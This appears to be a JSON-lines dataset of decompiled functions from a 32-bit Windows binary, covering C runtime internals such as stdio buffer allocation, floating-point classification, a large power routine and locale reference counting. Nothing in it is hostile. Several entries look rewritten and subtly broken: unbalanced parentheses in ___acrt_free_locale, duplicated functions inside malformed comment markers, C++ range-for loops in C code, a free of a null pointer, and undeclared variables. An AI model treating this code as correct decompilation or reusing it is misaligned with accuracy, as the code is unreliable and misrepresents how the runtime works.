{"Function Name": "___acrt_stdio_allocate_buffer_nolock", "Address": "1003078c", "Source Code": "void __cdecl ___acrt_stdio_allocate_buffer_nolock(undefined4 *buffer)\n{\n    uint *statusFlag; \n    LPVOID allocatedMemory; \n    globalCounter++; \n    allocatedMemory = __malloc_base(0x1000); \n    buffer[1] = allocatedMemory; \n    FID_conflict__free((void *)0x0); \n    statusFlag = buffer + 3; \n    LOCK(); \n    if (buffer[1] == 0) { \n        *statusFlag |= 0x400; \n        buffer[6] = 2; \n        buffer[1] = buffer + 5; \n    } else {\n        *statusFlag |= 0x40; \n        buffer[6] = 0x1000; \n    }\n    UNLOCK(); \n    buffer[2] = 0; \n    *buffer = buffer[1]; \n    return; \n}"}
{"Function Name": "__fpclass", "Address": "100307e9", "Source Code": "int __cdecl __fpclass(double inputValue) \n{\n    int classificationResult; \n    \n    if ((inputValue._6_2_ & 0x7ff0) == 0x7ff0) {\n        \n        classificationResult = __sptype(inputValue._0_4_, (uint)((ulonglong)inputValue >> 0x20));\n        if (classificationResult == 1) {\n            return 0x200; \n        }\n        if (classificationResult == 2) {\n            return 4; \n        }\n        return (classificationResult == 3) ? 2 : 1; \n    }\n    \n    \n    if ((((ulonglong)inputValue & 0x7ff0000000000000) == 0) &&\n        ((((ulonglong)inputValue & 0xfffff00000000) != 0 || (inputValue._0_4_ != 0)))) {\n        \n        return (-(uint)(((ulonglong)inputValue & 0x8000000000000000) != 0) & 0xffffff90) + 0x80;\n    }\n    \n    \n    if (NAN(inputValue) != (inputValue == 0.0)) {\n        \n        return (-(uint)(((ulonglong)inputValue & 0x8000000000000000) != 0) & 0xffffffe0) + 0x40;\n    }\n    \n    \n    return (-(uint)(((ulonglong)inputValue & 0x8000000000000000) != 0) & 0xffffff08) + 0x100;\n}"}
{"Function Name": "FUN_100308b9", "Address": "100308b9", "Source Code": "float10 __cdecl FUN_100308b9(double param_1,uint param_2,uint param_3)\n{\nuint uVar1;\nuint uVar2;\nuint uVar3;\nint iVar4;\nuint uVar5;\nuint uVar6;\nuint uVar7;\nushort uVar8;\ndouble dVar9;\ndouble dVar10;\nundefined8 in_XMM1_Qa;\ndouble dVar11;\nushort uVar16;\nundefined auVar12 [16];\nundefined auVar13 [16];\nundefined auVar14 [16];\nundefined auVar15 [16];\nulonglong in_XMM2_Qa;\nlonglong lVar17;\nulonglong uVar18;\nlonglong lVar22;\nundefined auVar19 [16];\nundefined auVar20 [16];\nundefined auVar21 [16];\nulonglong in_XMM3_Qa;\nulonglong uVar23;\ndouble dVar24;\ndouble dVar25;\ndouble dVar26;\ndouble dVar27;\ndouble dVar28;\ndouble dVar29;\ndouble dVar30;\n\ndVar9 = (double)((ulonglong)param_1 >> 0x2c);\nuVar8 = (ushort)((ulonglong)param_1 >> 0x30);\nuVar1 = (SUB82(dVar9,0) & 0xff) + 1 & 0x1fe;\ndVar29 = (double)((ulonglong)DAT_10040690 & (ulonglong)param_1 | (ulonglong)DAT_100406a0) *\n*(double *)(&DAT_10043678 + uVar1 * 4);\ndVar26 = *(double *)(&DAT_10043678 + uVar1 * 4);\ndVar10 = *(double *)(&DAT_10043a90 + uVar1 * 8);\ndVar28 = *(double *)(&UNK_10043a98 + uVar1 * 8);\nuVar5 = 0x7fef - uVar8;\nuVar1 = SUB84(param_1,0);\nuVar7 = (uint)((ulonglong)param_1 >> 0x20);\ndVar27 = param_1;\nif ((uVar8 - 0x10 | uVar5) < 0x80000000) {\nuVar5 = 0;\nuVar6 = 0x3fe7f;\nLAB_10030936:\nuVar2 = ((ushort)((ulonglong)dVar29 >> 0x26) & 0xff) + 1 & 0x1fe;\ndVar24 = (double)((ulonglong)dVar27 & (ulonglong)DAT_10040690 | (ulonglong)DAT_100406a0);\ndVar11 = (double)(DAT_100406e8 & (ulonglong)dVar24);\nin_XMM3_Qa = in_XMM3_Qa >> 0x1f;\ndVar24 = dVar24 - dVar11;\nuVar3 = ((ushort)((ulonglong)(dVar29 * *(double *)(&DAT_100442a0 + uVar2 * 4)) >> 0x1f) & 0x1ff)\n+ 1 & 0x3fe;\ndVar25 = dVar26 * *(double *)(&DAT_100442a0 + uVar2 * 4) *\n*(double *)(&DAT_10044ec0 + uVar3 * 4);\ndVar29 = dVar29 * *(double *)(&DAT_100442a0 + uVar2 * 4) *\n*(double *)(&DAT_10044ec0 + uVar3 * 4);\ndVar27 = dVar10 + *(double *)(&DAT_100446b0 + uVar2 * 8) +\n(double)(int)((longlong)dVar9 - (ulonglong)uVar6 >> 8) +\n*(double *)(&DAT_100456d0 + uVar3 * 8);\ndVar9 = dVar28 + *(double *)(&DAT_100446b8 + uVar2 * 8) + *(double *)(&DAT_100456d8 + uVar3 * 8)\n;\ndVar10 = (double)(DAT_100406e8 & (ulonglong)dVar25);\ndVar25 = dVar25 - dVar10;\ndVar30 = DAT_100406f0 + dVar29;\ndVar28 = dVar27 + dVar30;\ndVar26 = (double)CONCAT44(param_3,param_2);\nuVar16 = (ushort)(param_3 >> 0x10);\ndVar27 = dVar27 - dVar28;\nuVar2 = (uint)(ushort)((ulonglong)dVar28 >> 0x30);\ndVar10 = (((dVar29 - dVar10 * dVar11) - dVar11 * dVar25) - dVar10 * dVar24) - dVar24 * dVar25;\ndVar11 = dVar30 - dVar10;\ndVar29 = dVar28 - dVar10;\nuVar6 = uVar16 & 0x7ff0;\nif (uVar6 < 0x7ff0) {\niVar4 = (uVar6 - 0x3ff0) + (uVar2 & 0x7ff0);\nif ((0x40a0U - iVar4 | iVar4 - 0x3c70U) < 0x80000000) {\nLAB_10030a88:\ndVar24 = (double)(DAT_100406e8 & (ulonglong)dVar26);\ndVar25 = (double)(DAT_100406e8 & (ulonglong)dVar29);\ndVar10 = (dVar27 + dVar30) - (dVar10 - (dVar28 - dVar29));\ndVar28 = dVar24 * dVar25 * 128.0;\nuVar1 = (uint)ROUND(dVar28);\ndVar26 = dVar24 * (dVar29 - dVar25) + dVar25 * (dVar26 - dVar24) +\n(dVar29 - dVar25) * (dVar26 - dVar24);\nif (0 < (int)(0x1ff7f - uVar1 | uVar1 + 0x1e1ff)) {\niVar4 = (uVar1 & 0x7f) * 0x10;\nauVar12._0_8_ = (double)((ulonglong)((uVar5 + uVar1 & 0xffffff80) + 0x1ff80) << 0x2d);\nauVar12._8_4_ = 0;\nauVar12._12_4_ = (int)((ulonglong)auVar12._0_8_ >> 0x20);\ndVar27 = *(double *)(&DAT_10046700 + iVar4) * auVar12._0_8_;\ndVar26 = (dVar28 - ((dVar28 + _DAT_10040680) - _DAT_10040680)) * 0.0078125 +\ndVar26 + ((_DAT_100466e0 * dVar11 + _DAT_100466f0 * dVar11 * dVar11) *\ndVar11 * dVar11 +\n_UNK_100466e8 * dVar11 + _UNK_100466f8 * dVar11 * dVar11 +\ndVar9 + dVar10) * (double)CONCAT44(param_3,param_2);\nreturn (float10)(dVar26 * dVar26 * dVar27 *\n(_DAT_100406d0 + _DAT_100406c0 * dVar26) * dVar26 * dVar26 +\n*(double *)(&UNK_10046708 + iVar4) * auVar12._8_8_ +\n(_UNK_100406d8 + _UNK_100406c8 * dVar26) * dVar26 * dVar26 * dVar27 +\nDAT_100406e0 * dVar26 * dVar27 + dVar27);\n}\nif ((int)uVar1 < 1) {\nif ((int)uVar1 < -0x3fdff) {\nLAB_100312e7:\niVar4 = 0x19;\ndVar26 = (double)((ulonglong)(DAT_10040728 * DAT_10040728) | (ulonglong)uVar5 << 0x2d);\ngoto LAB_1003108e;\n}\nuVar5 = uVar5 + 0x80;\nuVar7 = (uVar1 & 0xffffff80) + 0x3fe80;\nuVar8 = 0;\n}\nelse {\nif (0x3ffff < uVar1) goto LAB_1003130a;\nuVar5 = uVar5 + 0x3ff00;\nuVar7 = uVar1 - 0x80 & 0xffffff80;\nuVar8 = 0x3ff0;\n}\niVar4 = (uVar1 & 0x7f) * 0x10;\nuVar1 = ((int)-(uVar7 - 0x1ff80) >> 7) + 2;\nauVar15._0_8_ = (double)((ulonglong)uVar7 << 0x2d);\nauVar15._8_4_ = 0;\nauVar15._12_4_ = (int)((ulonglong)auVar15._0_8_ >> 0x20);\ndVar29 = *(double *)(&DAT_10046700 + iVar4) * auVar15._0_8_;\ndVar10 = (dVar28 - ((dVar28 + _DAT_10040680) - _DAT_10040680)) * 0.0078125 +\ndVar26 + ((_DAT_100466e0 * dVar11 + _DAT_100466f0 * dVar11 * dVar11) *\ndVar11 * dVar11 +\n_UNK_100466e8 * dVar11 + _UNK_100466f8 * dVar11 * dVar11 + dVar9 + dVar10\n) * (double)CONCAT44(param_3,param_2);\ndVar26 = (double)((ulonglong)uVar5 << 0x2d);\nuVar18 = (ulonglong)(uVar1 + (uVar1 & 0x20));\ndVar28 = (double)(-1L << uVar18 & (ulonglong)dVar29);\ndVar10 = dVar10 * dVar10 * dVar29 *\n(_DAT_100406d0 + _DAT_100406c0 * dVar10) * dVar10 * dVar10 +\n*(double *)(&UNK_10046708 + iVar4) * auVar15._8_8_ +\n(_UNK_100406d8 + _UNK_100406c8 * dVar10) * dVar10 * dVar10 * dVar29 +\nDAT_100406e0 * dVar10 * dVar29;\ndVar27 = (double)((ulonglong)(dVar28 + dVar10) & -1L << uVar18);\ndVar10 = dVar10 + (dVar28 - dVar27) + (dVar29 - dVar28);\nif ((int)(uVar7 - 0x1ff80) < 1) {\ndVar26 = dVar10 * dVar26 + dVar27 * dVar26;\ndVar26 = dVar26 + (double)((ulonglong)uVar8 << 0x30) * dVar26;\niVar4 = 0x18;\nif ((((ushort)((ulonglong)dVar26 >> 0x30) & 0x7ff0) != 0x7ff0) &&\n(iVar4 = 0x19, ((ulonglong)dVar26 & 0x7ff0000000000000) != 0)) {\nreturn (float10)dVar26;\n}\n}\nelse {\ndVar26 = (dVar10 + dVar27) * dVar26;\ndVar26 = dVar26 + (double)((ulonglong)uVar8 << 0x30) * dVar26;\niVar4 = 0x18;\nif ((((ushort)((ulonglong)dVar26 >> 0x30) & 0x7ff0) != 0x7ff0) &&\n(iVar4 = 0x19, ((ulonglong)dVar26 & 0x7ff0000000000000) != 0)) {\nreturn (float10)dVar26;\n}\n}\n}\nelse {\ndVar28 = dVar26 * dVar29;\nuVar1 = (ushort)((ulonglong)dVar28 >> 0x30) & 0x7ff0;\nuVar7 = uVar1 - 0x3c70;\nif ((0x40a0 - uVar1 | uVar7) < 0x80000000) goto LAB_10030a88;\nif (0x7fffffff < uVar7) {\nreturn (float10)(double)((ulonglong)(uVar5 | 0x1ff80) << 0x2d);\n}\nif (((uVar16 ^ (uVar8 & 0x7ff0) + 0xc010) & 0x8000) != 0) goto LAB_100312e7;\nLAB_1003130a:\niVar4 = 0x18;\nif (uVar5 == 0) {\ndVar26 = DAT_10040720 * DAT_10040720;\n}\nelse {\ndVar26 = DAT_10040718 * DAT_10040720;\n}\n}\ngoto LAB_1003108e;\n}\ndVar26 = (double)CONCAT44(uVar5,uVar2);\nif (uVar1 == 0) {\nif (uVar7 == 0x3ff00000) goto LAB_1003108b;\ndVar26 = (double)CONCAT44(uVar5,uVar7);\nif (uVar7 == 0xbff00000) {\nreturn (float10)1;\n}\n}\n}\nelse {\nuVar6 = param_3 & DAT_100406b0._4_4_;\nuVar18 = in_XMM3_Qa >> 0x30;\nif (uVar6 < 0x7ff00000) {\nif ((param_2 | uVar6) == 0) {\niVar4 = 0x1a;\ndVar26 = DAT_100406a0;\nif ((uVar1 | uVar7 & 0x7fffffff) != 0) {\niVar4 = 0x1d;\nif (((uVar7 & 0x7fffffff) < 0x7ff00001) &&\n(((uVar7 & 0x7fffffff) < 0x7ff00000 || (uVar1 == 0)))) {\nreturn (float10)DAT_100406a0;\n}\n}\ngoto LAB_1003108e;\n}\nif ((int)uVar5 < 0) {\nuVar23 = in_XMM3_Qa << 0x34;\niVar4 = (uVar6 >> 0x14) - 0x3f3;\nin_XMM3_Qa = 0;\nuVar16 = (ushort)((ushort)((ulonglong)in_XMM1_Qa >> 0x30) & (ushort)uVar18) >> 4;\nlVar17 = (CONCAT44(param_3,param_2) |\nCONCAT44(DAT_100406b0._4_4_,(undefined4)DAT_100406b0) << 0x34) <<\n(ulonglong)\nCONCAT22((ushort)(-1 < iVar4) * (short)((uint)iVar4 >> 0x10),\n(ushort)(-1 < (short)iVar4) * (short)iVar4);\nlVar22 = (in_XMM2_Qa | uVar23) << (ulonglong)(ushort)((-1 < (short)uVar16) * uVar16);\nauVar19._0_4_ = -(uint)((int)lVar17 == 0);\nauVar19._4_4_ = -(uint)((int)((ulonglong)lVar17 >> 0x20) == 0);\nauVar19._8_4_ = -(uint)((int)lVar22 == 0);\nauVar19._12_4_ = -(uint)((int)((ulonglong)lVar22 >> 0x20) == 0);\nuVar16 = (ushort)(SUB161(auVar19 >> 7,0) & 1) | (ushort)(SUB161(auVar19 >> 0xf,0) & 1) << 1\n| (ushort)(SUB161(auVar19 >> 0x17,0) & 1) << 2 |\n(ushort)(SUB161(auVar19 >> 0x1f,0) & 1) << 3 |\n(ushort)(SUB161(auVar19 >> 0x27,0) & 1) << 4 |\n(ushort)(SUB161(auVar19 >> 0x2f,0) & 1) << 5 |\n(ushort)(SUB161(auVar19 >> 0x37,0) & 1) << 6 |\n(ushort)(SUB161(auVar19 >> 0x3f,0) & 1) << 7;\nuVar6 = 0x7fef - uVar5 & 0x7fff;\nif (0x7fef < uVar6) {\nauVar13._0_4_ = -(uint)((int)((ulonglong)DAT_10040690 & (ulonglong)param_1) == 0);\nauVar13._4_4_ =\n-(uint)((int)(((ulonglong)DAT_10040690 & (ulonglong)param_1) >> 0x20) == 0);\nauVar13._8_4_ = 0xffffffff;\nauVar13._12_4_ = 0xffffffff;\nif ((ushort)((ushort)(SUB161(auVar13 >> 7,0) & 1) |\n(ushort)(SUB161(auVar13 >> 0xf,0) & 1) << 1 |\n(ushort)(SUB161(auVar13 >> 0x17,0) & 1) << 2 |\n(ushort)(SUB161(auVar13 >> 0x1f,0) & 1) << 3 |\n(ushort)(SUB161(auVar13 >> 0x27,0) & 1) << 4 |\n(ushort)(SUB161(auVar13 >> 0x2f,0) & 1) << 5 |\n(ushort)(SUB161(auVar13 >> 0x37,0) & 1) << 6 |\n(ushort)(SUB161(auVar13 >> 0x3f,0) & 1) << 7) == 0xff) {\nif (((ulonglong)param_1 & 0x8000000000000000) != 0) {\nif ((uVar16 != 0xff) ||\n(lVar17 = CONCAT44(param_3,param_2) <<\n(ulonglong)(((param_3 & DAT_100406b0._4_4_) >> 0x14) - 0x3f4),\nlVar22 = auVar19._8_8_ << (ulonglong)(_UNK_100406bc >> 0x14),\nauVar21._0_4_ = -(uint)((int)lVar17 == 0),\nauVar21._4_4_ = -(uint)((int)((ulonglong)lVar17 >> 0x20) == 0),\nauVar21._8_4_ = -(uint)((int)lVar22 == 0),\nauVar21._12_4_ = -(uint)((int)((ulonglong)lVar22 >> 0x20) == 0),\n(ushort)((ushort)(SUB161(auVar21 >> 7,0) & 1) |\n(ushort)(SUB161(auVar21 >> 0xf,0) & 1) << 1 |\n(ushort)(SUB161(auVar21 >> 0x17,0) & 1) << 2 |\n(ushort)(SUB161(auVar21 >> 0x1f,0) & 1) << 3 |\n(ushort)(SUB161(auVar21 >> 0x27,0) & 1) << 4 |\n(ushort)(SUB161(auVar21 >> 0x2f,0) & 1) << 5 |\n(ushort)(SUB161(auVar21 >> 0x37,0) & 1) << 6 |\n(ushort)(SUB161(auVar21 >> 0x3f,0) & 1) << 7) == 0xff)) {\nif ((param_3 & 0x80000000) != 0) {\nreturn (float10)0;\n}\ngoto LAB_1003101f;\n}\nif ((param_3 & 0x80000000) == 0) {\nreturn (float10)_DAT_10040708;\n}\ngoto LAB_10030ed9;\n}\nif ((param_3 & 0x80000000) != 0) {\nreturn (float10)0;\n}\ngoto LAB_1003101f;\n}\ngoto LAB_10030f1f;\n}\nif (uVar16 == 0xff) {\nin_XMM3_Qa = 0;\nlVar17 = CONCAT44(param_3,param_2) <<\n(ulonglong)(((param_3 & DAT_100406b0._4_4_) >> 0x14) - 0x3f4);\nauVar20._0_4_ = -(uint)((int)lVar17 == SUB84(DAT_10040710,0));\nauVar20._4_4_ =\n-(uint)((int)((ulonglong)lVar17 >> 0x20) == (int)((ulonglong)DAT_10040710 >> 0x20));\nauVar20._8_4_ = -(uint)(auVar19._8_4_ == 0);\nauVar20._12_4_ = -(uint)(auVar19._12_4_ == 0);\nin_XMM2_Qa = auVar20._8_8_;\nuVar5 = (ushort)((ushort)(SUB161(auVar20 >> 7,0) & 1) |\n(ushort)(SUB161(auVar20 >> 0xf,0) & 1) << 1 |\n(ushort)(SUB161(auVar20 >> 0x17,0) & 1) << 2 |\n(ushort)(SUB161(auVar20 >> 0x1f,0) & 1) << 3 |\n(ushort)(SUB161(auVar20 >> 0x27,0) & 1) << 4 |\n(ushort)(SUB161(auVar20 >> 0x2f,0) & 1) << 5 |\n(ushort)(SUB161(auVar20 >> 0x37,0) & 1) << 6 |\n(ushort)(SUB161(auVar20 >> 0x3f,0) & 1) << 7) + 0x3ff01 & 0x40000;\nif (0xf < uVar6) {\nuVar6 = 0xbfe7f;\nin_XMM3_Qa = 0;\ngoto LAB_10030936;\n}\ngoto LAB_10030d54;\n}\ndVar26 = (double)((ulonglong)param_1 >> 0x20);\nin_XMM2_Qa = auVar19._8_8_ >> 0x20;\nuVar6 = uVar1 | uVar7 & 0x7fffffff;\nuVar5 = 0;\nif (uVar6 != 0) {\niVar4 = 0x1c;\ndVar26 = DAT_10040730;\ngoto LAB_1003108e;\n}\nLAB_10030dda:\ndVar27 = dVar9;\nif ((uVar6 & 0x7fffffff) == 0) {\nif ((param_3 & 0x80000000) == 0) {\nif ((uVar6 & uVar5 << 0xd) == 0) {\nreturn (float10)0;\n}\nLAB_10030ed9:\nreturn (float10)DAT_10040710;\n}\niVar4 = 0x1b;\ndVar26 = (double)((ulonglong)(uVar6 & uVar5 << 0xd | 0x7ff00000) << 0x20);\ngoto LAB_1003108e;\n}\n}\nelse {\nuVar5 = 0;\nLAB_10030d54:\ndVar9 = param_1 * 1.844674407370955e+19;\nuVar6 = uVar7;\ndVar27 = dVar9;\ndVar29 = DAT_10040690;\ndVar26 = DAT_100406a0;\nif (uVar1 == 0) goto LAB_10030dda;\n}\ndVar9 = (double)(((ulonglong)dVar27 & CONCAT44(DAT_100406b0._4_4_,(undefined4)DAT_100406b0))\n>> 0x2c);\nuVar6 = (SUB82(dVar9,0) & 0xff) + 1 & 0x1fe;\ndVar29 = (double)((ulonglong)dVar29 & (ulonglong)dVar27 | (ulonglong)dVar26) *\n*(double *)(&DAT_10043678 + uVar6 * 4);\ndVar26 = *(double *)(&DAT_10043678 + uVar6 * 4);\ndVar10 = *(double *)(&DAT_10043a90 + uVar6 * 8);\ndVar28 = *(double *)(&UNK_10043a98 + uVar6 * 8);\nuVar6 = 0x43e7f;\ngoto LAB_10030936;\n}\ndVar26 = param_1;\nif ((0x7fefffff < (uVar7 & 0x7fffffff)) && ((0x7ff00000 < (uVar7 & 0x7fffffff) || (uVar1 != 0)))\n) {\nLAB_10030f1f:\ndVar26 = param_1 + param_1;\niVar4 = 0x3ee;\ngoto LAB_1003108e;\n}\n}\ndVar10 = (double)CONCAT44(param_3,param_2);\nauVar14._0_4_ = -(uint)((int)((ulonglong)DAT_10040690 & (ulonglong)dVar10) == 0);\nauVar14._4_4_ = -(uint)((int)(((ulonglong)DAT_10040690 & (ulonglong)dVar10) >> 0x20) == 0);\nauVar14._8_4_ = -(uint)((int)(in_XMM3_Qa & in_XMM2_Qa) == 0);\nauVar14._12_4_ = -(uint)((int)((in_XMM3_Qa & in_XMM2_Qa) >> 0x20) == 0);\nif ((ushort)((ushort)(SUB161(auVar14 >> 7,0) & 1) | (ushort)(SUB161(auVar14 >> 0xf,0) & 1) << 1 |\n(ushort)(SUB161(auVar14 >> 0x17,0) & 1) << 2 |\n(ushort)(SUB161(auVar14 >> 0x1f,0) & 1) << 3 |\n(ushort)(SUB161(auVar14 >> 0x27,0) & 1) << 4 |\n(ushort)(SUB161(auVar14 >> 0x2f,0) & 1) << 5 |\n(ushort)(SUB161(auVar14 >> 0x37,0) & 1) << 6 |\n(ushort)(SUB161(auVar14 >> 0x3f,0) & 1) << 7) == 0xff) {\nif (dVar26 != -1.0) {\nif ((param_3 & 0x80000000) == 0) {\nif ((uVar8 & 0x7ff0) < 0x3ff0) {\nreturn (float10)0;\n}\n}\nelse if (0x3fef < (uVar8 & 0x7ff0)) {\nreturn (float10)0;\n}\nLAB_1003101f:\nreturn (float10)_DAT_10040700;\n}\nLAB_1003108b:\nreturn (float10)1;\n}\niVar4 = 0x3ee;\ndVar26 = dVar10 + dVar10;\nLAB_1003108e:\n___libm_error_support(&param_1,(undefined8 *)&param_2,(undefined8 *)&stack0xfffffff4,iVar4);\nreturn (float10)dVar26;\n}\nLocal Variable: local_c : undefined8\nLocal Variable: local_10 : undefined4\nLocal Variable: local_14 : undefined4\nLocal Variable: local_18 : undefined4\nLocal Variable: local_1c : undefined4"}
{"Function Name": "FUN_100317c0", "Address": "100317c0", "Source Code": "float10 __fastcall\nFUN_100317c0(undefined4 param_1, int param_2, undefined2 param_3, undefined4 param_4, undefined4 param_5,\n              undefined4 param_6, undefined4 param_7, undefined4 param_8)\n{\n    \n    double dStack_c = (double)in_ST0;\n    \n    __87except(param_2, NULL, &param_3);\n    \n    return (float10)dStack_c;\n}"}
{"Function Name": "__isleadbyte_l", "Address": "10031b78", "Source Code": "int __cdecl __isleadbyte_l(int character_code, _locale_t locale_data)\n{\n    ushort lead_byte_check; \n    int locale_info; \n    \n    FUN_1001bfff(&locale_info, (__acrt_ptd **)locale_data);\n    \n    \n    lead_byte_check = *(ushort *)(*(int *)locale_info + (character_code & 0xffU) * 2);\n    \n    \n    return lead_byte_check & 0x8000;\n}"}
{"Function Name": "___acrt_add_locale_ref", "Address": "10031bb7", "Source Code": "void __cdecl ___acrt_add_locale_ref(int locale_ref_param)\n{\n    int *int_pointer; \n    int **pointer_to_pointer = (int **)(locale_ref_param + 0x28); \n    int loop_counter = 6; \n    LOCK(); \n    *(int *)(locale_ref_param + 0xc) += 1; \n    UNLOCK(); \n    \n    for (int current_offset : {0x7c, 0x84, 0x80, 0x8c}) {\n        int_pointer = *(int **)(locale_ref_param + current_offset); \n        if (int_pointer != (int *)0x0) { \n            LOCK(); \n            *int_pointer += 1; \n            UNLOCK(); \n        }\n    }\n    \n    do {\n        if (pointer_to_pointer[-2] != (int *)&DAT_1004e2b0) { \n            int_pointer = *pointer_to_pointer; \n            if (int_pointer != (int *)0x0) { \n                LOCK(); \n                *int_pointer += 1; \n                UNLOCK(); \n            }\n        }\n        if (pointer_to_pointer[-3] != (int *)0x0) { \n            int_pointer = pointer_to_pointer[-1]; \n            if (int_pointer != (int *)0x0) { \n                LOCK(); \n                *int_pointer += 1; \n                UNLOCK(); \n            }\n        }\n        pointer_to_pointer += 4; \n    } while (--loop_counter != 0); \n    \n    ___acrt_locale_add_lc_time_reference(*(undefined ***)(locale_ref_param + 0x9c));\n}"}
{"Function Name": "___acrt_free_locale", "Address": "10031c34", "Source Code": "void __cdecl ___acrt_free_locale(void *locale_param)\n{\n    int *int_pointer; \n    void **void_pointer_offset = (void **)((int)locale_param + 0xa0); \n    int **int_pointer_offset = (int **)((int)locale_param + 0x28); \n    \n    if (((*(undefined ***)((int)locale_param + 0x88) != (undefined **)0x0) && \n        (*(undefined ***)((int)locale_param + 0x88) != &PTR_DAT_1004e0b8)) && \n        (*(int **)((int)locale_param + 0x7c) != (int *)0x0)) && \n        (**(int **)((int)locale_param + 0x7c) == 0)) { \n        \n        int_pointer = *(int **)((int)locale_param + 0x84); \n        if ((int_pointer != (int *)0x0) && (*int_pointer == 0)) { \n            FID_conflict__free(int_pointer); \n            ___acrt_locale_free_monetary(*(int *)((int)locale_param + 0x88)); \n        }\n        \n        int_pointer = *(int **)((int)locale_param + 0x80); \n        if ((int_pointer != (int *)0x0) && (*int_pointer == 0)) { \n            FID_conflict__free(int_pointer); \n            ___acrt_locale_free_numeric(*(void ***)((int)locale_param + 0x88)); \n        }\n        \n        FID_conflict__free(*(void **)((int)locale_param + 0x7c)); \n        FID_conflict__free(*(void **)((int)locale_param + 0x88)); \n    }\n    \n    \n    if ((*(int **)((int)locale_param + 0x8c) != (int *)0x0) && (**(int **)((int)locale_param + 0x8c) == 0)) {\n        FID_conflict__free((void *)(*(int *)((int)locale_param + 0x90) - 0xfe)); \n        FID_conflict__free((void *)(*(int *)((int)locale_param + 0x94) - 0x80)); \n        FID_conflict__free((void *)(*(int *)((int)locale_param + 0x98) - 0x80)); \n        FID_conflict__free(*(void **)((int)locale_param + 0x8c)); \n    }\n    \n    ___acrt_locale_free_lc_time_if_unreferenced(*(undefined ***)((int)locale_param + 0x9c)); \n    \n    for (int loop_counter = 6; loop_counter > 0; loop_counter--) {\n        \n        if (((int_pointer_offset[-2] != (int *)&DAT_1004e2b0) && (int_pointer = *int_pointer_offset, int_pointer != (int *)0x0)) &&\n            (*int_pointer == 0)) {\n            FID_conflict__free(int_pointer); \n            FID_conflict__free(*void_pointer_offset); \n        }\n        \n        \n        if (((int_pointer_offset[-3] != (int *)0x0) && (int_pointer = int_pointer_offset[-1], int_pointer != (int *)0x0)) &&\n            (*int_pointer == 0)) {\n            FID_conflict__free(int_pointer); \n        }\n        \n        void_pointer_offset++; \n        int_pointer_offset += 4; \n    }\n    \n    FID_conflict__free(locale_param); \n}"}
{"Function Name": "___acrt_locale_add_lc_time_reference", "Address": "10031d7e", "Source Code": "\\*\nundefined * __cdecl ___acrt_locale_add_lc_time_reference(undefined **locale_reference)\n{\n    \n    if (locale_reference != (undefined **)0x0 && locale_reference != &PTR_DAT_1003fc50) {\n        LOCK(); \n        undefined *current_value = * (locale_reference + 0x2c); \n        * (locale_reference + 0x2c) = current_value + 1; \n        UNLOCK(); \n        return current_value + 1; \n    }\n    return (undefined *)0x7fffffff; \n}\n*\\ \n \nundefined * __cdecl ___acrt_locale_add_lc_time_reference(undefined **locale_reference)\n{\n    if (locale_reference != (undefined **)0x0 && locale_reference != &PTR_DAT_1003fc50) {\n        LOCK();\n        undefined *current_value = * (locale_reference + 0x2c);\n        * (locale_reference + 0x2c) = current_value + 1;\n        UNLOCK();\n        return current_value + 1;\n    }\n    return (undefined *)0x7fffffff;\n}"}
{"Function Name": "___acrt_locale_free_lc_time_if_unreferenced", "Address": "10031da7", "Source Code": "void __cdecl ___acrt_locale_free_lc_time_if_unreferenced(undefined **locale_resources)\n{\n    \n    \n    if (locale_resources != (undefined **)0x0 && locale_resources != &PTR_DAT_1003fc50 && locale_resources[0x2c] == (undefined *)0x0) {\n        \n        ___acrt_locale_free_time(locale_resources);\n        \n        FID_conflict__free(locale_resources);\n    }\n}"}
{"Function Name": "___acrt_locale_release_lc_time_reference", "Address": "10031dd7", "Source Code": "\\*\nundefined * __cdecl ___acrt_locale_release_lc_time_reference(undefined **locale_reference)\n{\n    \n    if (locale_reference != (undefined **)0x0 && locale_reference != &PTR_DAT_1003fc50) {\n        LOCK(); \n        undefined *value_at_offset = * (locale_reference + 0x2c); \n        * (locale_reference + 0x2c) = value_at_offset - 1; \n        UNLOCK(); \n        return value_at_offset - 1; \n    }\n    return (undefined *)0x7fffffff; \n}\n*\\ \n \nundefined * __cdecl ___acrt_locale_release_lc_time_reference(undefined **locale_reference)\n{\n    if (locale_reference != (undefined **)0x0 && locale_reference != &PTR_DAT_1003fc50) {\n        LOCK();\n        undefined *value_at_offset = * (locale_reference + 0x2c);\n        * (locale_reference + 0x2c) = value_at_offset - 1;\n        UNLOCK();\n        return value_at_offset - 1;\n    }\n    return (undefined *)0x7fffffff;\n}"}
{"Function Name": "___acrt_release_locale_ref", "Address": "10031e00", "Source Code": "void __cdecl ___acrt_release_locale_ref(int locale_ref)\n{\n    int *ref_count_ptr; \n    int **ref_count_ptr_ptr = (int **)(locale_ref + 0x28); \n    int loop_counter = 6; \n    if (locale_ref != 0) { \n        LOCK(); \n        *(int *)(locale_ref + 0xc) = *(int *)(locale_ref + 0xc) - 1; \n        UNLOCK(); \n        \n        for (int current_offset : {0x7c, 0x84, 0x80, 0x8c}) {\n            ref_count_ptr = *(int **)(locale_ref + current_offset); \n            if (ref_count_ptr != (int *)0x0) { \n                LOCK(); \n                *ref_count_ptr = *ref_count_ptr - 1; \n                UNLOCK(); \n            }\n        }\n        \n        do {\n            if (ref_count_ptr_ptr[-2] != (int *)&DAT_1004e2b0) { \n                ref_count_ptr = *ref_count_ptr_ptr; \n                if (ref_count_ptr != (int *)0x0) { \n                    LOCK(); \n                    *ref_count_ptr = *ref_count_ptr - 1; \n                    UNLOCK(); \n                }\n            }\n            if (ref_count_ptr_ptr[-3] != (int *)0x0) { \n                ref_count_ptr = ref_count_ptr_ptr[-1]; \n                if (ref_count_ptr != (int *)0x0) { \n                    LOCK(); \n                    *ref_count_ptr = *ref_count_ptr - 1; \n                    UNLOCK(); \n                }\n            }\n            ref_count_ptr_ptr += 4; \n        } while (--loop_counter != 0); \n        \n        \n        ___acrt_locale_release_lc_time_reference(*(undefined ***)(locale_ref + 0x9c));\n    }\n}"}
